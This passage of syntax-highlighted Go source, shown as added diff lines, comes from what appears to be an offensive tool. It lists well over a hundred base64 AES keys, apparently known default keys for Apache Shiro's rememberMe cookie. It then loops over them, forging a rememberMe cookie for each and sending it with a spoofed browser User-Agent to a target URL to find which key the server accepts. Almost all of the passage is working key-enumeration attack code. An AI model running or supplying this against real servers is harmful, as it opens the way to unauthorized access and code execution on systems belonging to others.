+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;kPv59vyqzj00x11LXJZTjJ2UHW48jzHN&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;6ZmI6I2j5Y+R5aSn5ZOlAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1QWLxg+NYmxraMoxAXu/Iw==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;a2VlcE9uR29pbmdBbmRGaQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;5aaC5qKm5oqA5pyvAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1AvVhdsgUs0FSA3SDFAdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;5RC7uBZLkByfFfJm22q/Zw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3AvVhdAgUs0FSA4SDFAdBg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;a3dvbmcAAAAAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;eXNmAAAAAAAAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;U0hGX2d1bnMAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Ymx1ZXdoYWxlAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;L7RioUULEFhRyxM7a2R/Yg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;UGlzMjAxNiVLeUVlXiEjLw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;bWluZS1hc3NldC1rZXk6QQ==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;ZUdsaGJuSmxibVI2ZHc9PQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;MTIzNDU2Nzg5MGFiY2RlZg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;OY//C4rhfwNxCQAQCrQQ1Q==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;bTBANVpaOUw0ampRWG43TVJFcF5iXjdJ&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;FP7qKJzdJOGkzoQzo2wTmA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;LEGEND-CAMPUS-CIPHERKEY==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;r0e3c16IdVkouZgk1TKVMg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;ZWvohmPdUsAWT3=KpPqda&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;k3+XHEg6D8tb2mGm7VJ3nQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;U3ByaW5nQmxhZGUAAAAAAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;tiVV6g3uZBGfgshesAQbjA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ZAvph3dsQs0FSL3SDFAdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;0AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;25BsmdYwjnfcWmnhAciDDg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3JvYhmBLUs0ETA5Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;5AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;6AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;6NfXkC7YVCV5DASIrEm1Rg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;cmVtZW1iZXJNZQAAAAAAAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;8AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;8BvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;9AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;OUHYQzxQ/W9e/UjiAGu6rg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;aU1pcmFjbGVpTWlyYWNsZQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;bXRvbnMAAAAAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;5J7bIJIV0LQSN3c9LPitBQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;bya2HkYo57u6fWh5theAWw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f/SY5TIve5WWzT4aQlABJA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;WuB+y2gcHRnY2Lg9+Aqmqg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3qDVdLawoIr1xFd6ietnwg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;YI1+nBV//m7ELrIyDHm6DQ==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;6Zm+6I2j5Y+R5aS+5ZOlAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2A2V+RFLUs+eTA3Kpr+dag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;6ZmI6I2j3Y+R1aSn5BOlAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;SkZpbmFsQmxhZGUAAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2cVtiE83c4lIrELJwKGJUw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;fsHspZw/92PrS3XrPW+vxw==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;XTx6CKLo/SdSgub+OPHSrw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;sHdIjUN6tzhl8xZMG3ULCQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;O4pdf+7e+mZe8NyxMTPJmQ==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;HWrBltGvEZc14h9VpMvZWw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;rPNqM6uKFCyaL10AK51UkQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Y1JxNSPXVwMkyvES/kJGeQ==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;lT2UvDUmQwewm6mMoiw4Ig==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;MPdCMZ9urzEA50JDlDYYDg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xVmmoltfpb8tTceuT5R7Bw==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;c+3hFGPjbgzGdrC+MHgoRQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ClLk69oNcA3m+s0jIMIkpg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Bf7MfkNR0axGGptozrebag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;1tC/xrDYs8ey+sa3emtiYw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ZmFsYWRvLnh5ei5zaGlybw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;cGhyYWNrY3RmREUhfiMkZA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;IduElDUpDDXE677ZkhhKnQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;yeAAo1E8BOeAYfBlm4NG9Q==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;cGljYXMAAAAAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;2itfW92XazYRi5ltW0M2yA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;XgGkgqGqYrix9lI6vxcrRw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ertVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;5AvVhmFLUS0ATA4Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;s0KTA3mFLUprK4AvVhsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;hBlzKg78ajaZuTE0VLzDDg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;9FvVhtFLUs0KnA3Kprsdyg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;d2ViUmVtZW1iZXJNZUtleQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;yNeUgSzL/CfiWw1GALg6Ag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;NGk/3cQ6F5/UNPRh8LpMIg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4BvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;MzVeSkYyWTI2OFVLZjRzZg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;CrownKey==a12d/dakdad&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;empodDEyMwAAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;A7UzJgh1+EWj5oBFi+mSgw==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;c2hpcm9fYmF0aXMzMgAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;i45FVt72K2kLgvFrJtoZRw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;66v1O8keKNV3TTcGPK1wzg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;U3BAbW5nQmxhZGUAAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ZnJlc2h6Y24xMjM0NTY3OA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Jt3C93kMR9D5e8QzwfsiMw==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;MTIzNDU2NzgxMjM0NTY3OA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;vXP33AonIp9bFwGl7aT7rA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;V2hhdCBUaGUgSGVsbAAAAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;Q01TX0JGTFlLRVlfMjAxOQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Is9zJ3pzNh2cgTHB4ua3+Q==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;SDKOLKn2J1j/2BHjeZwAoQ==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;NsZXjXVklWPZwOfkvk6kUA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;GAevYnznvgNCURavBhCr1w==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;zSyK5Kp6PZAAjlT+eeNMlg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;bXdrXl9eNjY2KjA3Z2otPQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;RVZBTk5JR0hUTFlfV0FPVQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;WkhBTkdYSUFPSEVJX0NBVA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;GsHaWo4m1eNbE0kNSMULhg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;l8cc6d2xpkT1yFtLIcLHCg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;KU471rVNQ6k7PQL4SqxgJg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;kPH+bIxk5D2deZiIxcabaA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;kPH+bIxk5D2deZiIxcacaA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4AvVhdsgUs0F563SDFAdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;FL9HL9Yu5bVUJ0PDU1ySvg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;fdCEiK9YvLC668sS43CJ6A==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;FJoQCiz0z5XWz2N2LyxNww==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;HeUZ/LvgkO7nsa18ZyVxWQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;HoTP07fJPKIRLOWoVXmv+Q==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;iycgIIyCatQofd0XXxbzEg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;m0/5ZZ9L4jjQXn7MREr/bw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;NoIw91X9GSiCrLCF03ZGZw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oPH+bIxk5E2enZiIxcqaaA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;QAk0rp8sG0uJC4Ke2baYNA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Rb5RN+LofDWJlzWAwsXzxg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;s2SE9y32PvLeYo+VGFpcKA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;SrpFBcVD89eTQ2icOD0TMg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Us0KvVhTeasAm43KFLAeng==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;YWJjZGRjYmFhYmNkZGNiYQ==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;zIiHplamyXlVB11UXWol8g==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ZjQyMTJiNTJhZGZmYjFjMQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;kPv59vyqzj00x11LXJZTjJ2UHW48jzHN&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;2adsfasdqerqerqewradsf==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2AvVCXsxUs0FSA7SYFjdQg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2AvVhdsgERdsSA3SDFAdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;2AvVhdsgUs0FSA3SaFAdfg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2AvVhdsgUs0FSA3SDFAder==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2AvVhdsgUsOFSA3SDFAdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;2AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2AvVidsaUSofSA3SDFAdog==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3Av2hmFLAs0BTA3Kprsd6E==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;3AvVhdAgUs1FSA4SDFAdBg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3AvVhMFLIs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3AvVhmFLUs0KTA3KaTHGFg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;3AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3qDVdLawoIr1xFd6ietnsg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3rvVhmFLUs0KAT3Kprsdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;4AvVhm2LUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4AvVhmFLUs0KTA3KAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4AvVhmFLUs0KTA3Kprseaf==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;4AvVhmFLUs0TTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4AvVhmFLUs5KTA1Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4AvVhmFLUsOKTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;4rvVhmFLUs0KAT3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4WCZSJyqdUQsije93aQIRg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;5AvVhCsgUs0FSA3SDFAdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;5oiR5piv5p2h5ZK46bG8IQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;8AvVhdsgUs0FSA3SDFAdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;9Ami6v2G5Y+r5aPnE4OlBB==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;9AVvhnFLuS3KTV8KprsdAg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;AF05JAuyuEB1ouJQ9Y9Phg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;aG91c2Vob3VzZWhvdXNlMg==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;A+kWR7o9O0/G/W6aOGesRA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;AztiX2RUqhc7dhOzl1Mj8Q==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;b2EAAAAAAAAAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;B9rPF8FHhxKJZ9k63ik7kQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;c2hvdWtlLXBsdXMuMjAxNg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Cj6LnKZNLEowAZrdqyH/Ew==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;duhfin37x6chw29jsne45m==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;fCq+/xW488hMTCE+cmJ3FF==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;FjbNm1avvGmWE9CY2HqV75==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;FP7qKJzdJOGkzoQzo2wTmA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;GhrF5zLfq1Dtadd1jlohhA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;GHxH6G3LFh8Zb3NwoRgfFA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;HOlg7NHb9potm0n5s4ic0Q==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;lt181dcQVz/Bo9Wb8ws/Cg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;M2djA70UBBUPDibGZBRvrA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;mIccZhQt6EBHrZIyw1FAXQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;pbnA+Qzen1vjV3rNqQBLHg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;pyyX1c5x2f0LZZ7VKZXjKO==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;QDFCnfkLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;QF5HMyZAWDZYRyFnSGhTdQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;qQFtSnnj/sx7vu51ixAyEQ==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;QUxQSEFNWVNPRlRCVUlMRA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;QVN1bm5uJ3MgU3Vuc2l0ZQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;R29yZG9uV2ViAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;sBv2t3okbdm3U0r2EVcSzB==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;sgIQrqUVxa1OZRRIK3hLZw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;TGMPe7lGO/Gbr38QiJu1/w==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;UGlzMjAxNiVLeUVlXiEjLw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;w793pPq5ZVBKkj8OhV4KaQ==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;wrjUh2ttBPQLnT4JVhriug==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;wyLZMDifwq3sW1vhhHpgKA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;YnlhdnMAAAAAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;YVd4dmRtVjViM1UlM0QIdn==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;YWdlbnRAZG1AMjAxOHN3Zg==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;YystomRZLMUjiK0Q1+LFdw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Z3VucwAAAAAAAAAAAAABBB==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;Z3VucwACAOVAKALACAADSA==&#34;</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">for</span><span class="w"> </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="nx">key_dict</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;\033[34mTry key: &#34;</span><span class="o">+</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\033[0m&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">rememberMe</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nf">generateRememberMe</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="nx">rememberMe</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="w"> </span><span class="p">{</span><span class="k">continue</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">client</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{</span><span class="nx">Timeout</span><span class="p">:</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nf">NewRequest</span><span class="p">(</span><span class="s">&#34;GET&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">&#34;Cookie&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;rememberMe=&#34;</span><span class="o">+</span><span class="nx">rememberMe</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">&#34;User-Agent&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">resp</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nf">Do</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nx">log</span><span class="p">.</span><span class="nf">Panicln</span><span class="p">(</span><span class="s">&#34;Error with http request,please check your url&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
